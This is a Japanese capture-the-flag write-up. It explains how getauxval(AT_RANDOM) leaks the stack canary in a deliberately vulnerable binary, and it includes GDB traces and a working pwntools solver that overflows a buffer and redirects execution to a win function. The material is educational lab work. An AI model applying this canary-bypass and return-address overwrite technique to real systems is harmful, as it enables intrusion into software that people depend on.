# Auxiliary vectors are our friends

## 問題

Linuxには補助ベクトルという概念があります！

```c
void __attribute__((__used__)) win(void) {
    char* argv[] = {"/bin/cat", "/flag.txt", NULL};
    execve(argv[0], argv, NULL);
}

void vuln(void) {
    char buf[8] = {0};
    printf("Please leave a message> ");
    fflush(stdout);
    read(STDIN_FILENO, buf, 32);
}

int main(void) {
    unsigned long type;
    printf("type> ");
    fflush(stdout);
    scanf("%lu", &type);
    unsigned long val = getauxval(type);
    printf("val: %lu\n", val);
    print_hex_values_if_readable((void*)val);

    vuln();
}
```

## 概要

vuln関数のbuf配列には8バイトに対して32バイトまで読み込めるので、BOFの脆弱性があります。

これを利用し、リターンアドレスを書き換えることで、どこからも呼び出されていないwin関数を呼び出せそうに見えます。

しかし、この問題の実行ファイルはスタック破壊検知が有効であるため、そのまま書き換えるとvuln関数終了時に強制終了されてしまいます。

その前に、getauxvalという関数に引数を渡し、その戻り値と戻り値の場所にある16バイトを教えてもらえるようですが、これをどのように活用すればいいのでしょうか？

## 方針

スタックカナリアの取得元であるAT_RANDOMの場所から値を取得することで、カナリアを破壊することなくリターンアドレスを書き換える。

## 解法

まず、全く馴染みが無いgetauxval関数について調べてみました。
```c
#include <sys/auxv.h>

unsigned long getauxval(unsigned long type);
```
getauxval関数は、起動時にカーネルやインタプリタから渡される補助ベクトル(auxiliary vector)から値を取得する関数のようです。

このtypeを指定することでさまざまな情報を得ることができるようですが、その中で1つ気になるのがありました。

それは、AT_RANDOM (25)です。

これはランダムな16バイトが入った場所のアドレスです。

カナリア値も、カーネルがプロセス起動時に生成したランダム値がもとになっているので、関係あるかもしれません。

これらの関係性を確かめるために、GDBでデバッグ実行してみることにします。

まずはスタックのおさらいです。

vuln関数が呼び出され、領域が確保されてカナリア値が置かれると、スタックは下記のような状態になるはずです。
```
↑高アドレス
----------------------
戻り先アドレス (8)
----------------------
退避ベースポインタ (8)
---------------------- ←ベースポインタ
カナリア値 (8)
----------------------
buf[7]～buf[0] (8)
---------------------- ←スタックポインタ
↓低アドレス
```
これらの値をGDBで調査してみましょう。

vuln関数終了時、スタック破壊チェックの直前の場所を確認します。
```
  401424:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401428:	64 48 2b 04 25 28 00 	sub    %fs:0x28,%rax
  40142f:	00 00 
  401431:	74 05                	je     401438 <vuln+0x71>
  401433:	e8 b8 fc ff ff       	call   4010f0 <__stack_chk_fail@plt>
  401438:	c9                   	leave
  401439:	c3                   	ret
```

0x401424で止めることにしましょう。

GDBでブレイクポイントを設定して実行し、スタックポインタから32バイト分表示してみます。

```
$ gdb chal
(gdb) b *0x401424
(gdb) r
type> 25
val: 140737488346521
0x7fffffffdd99 values: 43ee20c770723daf0dc48033088d5fcf
Please leave a message> Alpaca

Breakpoint 1, 0x0000000000401424 in vuln ()
(gdb) x/4gx $rsp
0x7fffffffd9b0: 0x000a616361706c41      0xaf3d7270c720ee00
0x7fffffffd9c0: 0x00007fffffffd9f0      0x00000000004014cf
```

1つ目の0x000a616361706c41は入力したAlpaca、2つ目の0xaf3d7270c720ee00は正規のカナリア値、3つ目の0x00007fffffffd9f0は退避したベースポインタ、4つ目の0x00000000004014cfは正規のリターンアドレスです。

この正規のカナリア値をvaluesで得られた値とよく見比べてみると、valuesの前半8バイトの先頭バイトを0x00に置き換えたものがカナリア値であることがわかります。

※スタックの値はリトルエンディアンで表示されているので、valuesの表示とは逆順になっています。

これを利用して、カナリア値を壊さないようにしつつ、リターンアドレスをwin関数のアドレスに書き換えます。

そのためにmessageとして送るべきペイロードは、
```
ダミー(8) + カナリア値(8) + ダミー(8) + win関数のアドレス(8)
```
となります。

win関数のアドレスは-no-pieオプションで固定されており、
```
$ nm chal | grep win
000000000040135f T win
```
より、0x40135fであることがわかります。

## ソルバー

```py
import pwn

PORT, HOST = "localhost", 1337
#PORT, HOST = "34.170.146.252", 39202
p = pwn.remote(PORT, HOST)

p.sendlineafter(b'type> ', b'25')
p.recvuntil(b'values: ')
d = p.recvline().decode().strip()
canary = b'\x00' + bytes.fromhex(d[2:16])
win_adr = pwn.p64(0x40135f)
payload = b'A'*8 + canary + b'A'*8 + win_adr
print(f"payload = {payload.hex()}")
p.sendlineafter(b'message> ', payload)
print(p.recvall().decode())
```
